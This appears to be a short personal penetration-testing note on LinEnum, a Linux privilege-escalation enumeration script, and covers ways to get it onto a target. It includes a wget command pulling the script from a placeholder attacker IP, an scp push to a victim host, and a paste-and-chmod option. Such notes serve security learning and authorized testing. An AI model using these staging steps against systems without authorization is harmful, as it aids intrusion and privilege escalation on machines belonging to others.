---
tags:
  - Penetration-Testing
  - Linux
  - PrivEsc
---
## LinEnum
- Simple bash script that performs common commands related to PrivEsc
### Download LinEnum
- https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
### Getting LinEnum onto Target
Option 1: Python Web Server + wget
1. Navigate to directory where LinEnum is stored on attacker
2. Start Python Web Server on attacker
```bash
python -m http.server 8000
```

3. Use wget to dowload LinEnum from Python server
```bash
wget <attacker_ip>:8000/LinEnum.sh
```

Option 2: Secure Copy (scp)
**May require knowing SSH password**
1. Navigate to directory where LinEnum is stored on attacker
2. Execute Secure Copy to victim
```bash
scp LinEnum.sh username@victim_ip:/tmp/
```

Option 3: Copy/Paste into Victim
1. Copy/Paste LinEnum script into victim using nano or Vi
2. Make file executable (chmod +x)
